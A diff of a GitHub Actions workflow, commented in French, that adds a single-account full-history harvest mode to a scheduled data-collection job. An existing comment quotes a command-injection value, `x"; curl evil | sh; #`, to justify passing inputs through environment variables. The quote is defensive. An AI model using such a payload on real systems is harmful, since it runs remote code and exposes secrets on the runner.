@@ -7,8 +7,13 @@ on:
     - cron: "0 7 * * *"
   workflow_dispatch:        # permet de lancer à la main depuis l'onglet Actions
     inputs:
+      mode:
+        description: "mise_a_jour (le cron : reprise + recouvrement) ou complete (tout l'historique d'UN compte, EXIGE user_id)"
+        type: choice
+        options: [mise_a_jour, complete]
+        default: mise_a_jour
       force:
-        description: "Ignorer le jour planifié (fetch tous les users)"
+        description: "mise_a_jour : ignorer le jour planifié (tous les users)"
         type: boolean
         default: false
       user_id:
@@ -16,13 +21,19 @@ on:
         type: string
         default: ""
       report_only:
-        description: "Republie juste le rapport depuis les données en base"
+        description: "mise_a_jour : republie juste le rapport depuis les données en base"
         type: boolean
         default: false
-      meta_since:
-        description: "Rejeu d'historique : fait repartir la récolte META de cette date (AAAA-MM-JJ). EXIGE user_id. Le reste de la récolte de CE compte tourne normalement (Google, GA4, Instagram, rapport, email)."
+      depuis:
+        description: "complete : date de départ AAAA-MM-JJ (vide = 37 mois, la limite de Meta)"
         type: string
         default: ""
+
+# L'ESSAI N'EST PAS UN MODE DE CE WORKFLOW, et c'est voulu (ticket 07 de
+# `.scratch/recolte/`). Il écrit un JSON de données client : sur le runner,
+# le fichier meurt avec la machine, et le publier en artefact l'exposerait à
+# quiconque lit ce dépôt PUBLIC. L'essai se lance en local
+# (`python3.12 saas/collecte/essai.py`), où le JSON reste chez David.
 
 # UNE RÉCOLTE À LA FOIS PAR COMPTE. Tant que le seul départ manuel était le
 # bouton « ↻ Mes données », personne ne pouvait en lancer deux coup sur coup.
@@ -68,25 +79,30 @@ jobs:
           # shell, `x"; curl evil | sh; #` s'exécuterait sur le runner, où
           # vivent SUPABASE_SERVICE_KEY et RESEND_API_KEY. Les
           # booléens sont comparés à la chaîne "true", jamais exécutés.
-          META_SINCE: ${{ inputs.meta_since }}
+          MODE: ${{ inputs.mode }}
+          DEPUIS: ${{ inputs.depuis }}
           USER_ID: ${{ inputs.user_id }}
           REPORT_ONLY: ${{ inputs.report_only }}
           FORCE: ${{ inputs.force }}
         run: |
-          W=saas/collecte/automatisation/fetch_all.py
-          if [ "$REPORT_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
-            python "$W" --report-only "$USER_ID"
-          elif [ -n "$META_SINCE" ]; then
-            # meta_since SANS user_id est refusé par le worker lui-même, et
-            # c'est volontaire : forcer le passage de TOUS les comptes un jour
-            # qui n'est celui de personne leur enverrait à tous l'email hebdo
-            # (publish_weekly_report envoie dès qu'il a une adresse, sans
-            # contrôle de jour). Un rejeu vise un compte.
-            python "$W" --meta-since "$META_SINCE" --user "$USER_ID"
+          M=saas/collecte/mise_a_jour.py
+          if [ "$MODE" = "complete" ]; then
+            # La récolte complète EXIGE un compte : le script le refuse
+            # lui-même sans `--user`, et c'est volontaire — forcer le passage de
+            # TOUS les comptes un jour qui n'est celui de personne leur
+            # enverrait à tous l'email hebdo (publish_weekly_report envoie dès
+            # qu'il a une adresse, sans contrôle de jour). Un rejeu vise un compte.
+            if [ -n "$DEPUIS" ]; then
+              python saas/collecte/recolte_complete.py --user "$USER_ID" --depuis "$DEPUIS"
+            else
+              python saas/collecte/recolte_complete.py --user "$USER_ID"
+            fi
+          elif [ "$REPORT_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
+            python "$M" --report-only "$USER_ID"
           elif [ -n "$USER_ID" ]; then
-            python "$W" --user "$USER_ID"
+            python "$M" --user "$USER_ID"
           elif [ "$FORCE" = "true" ]; then
-            python "$W" --force
+            python "$M" --force
           else
-            python "$W"
+            python "$M"
           fi
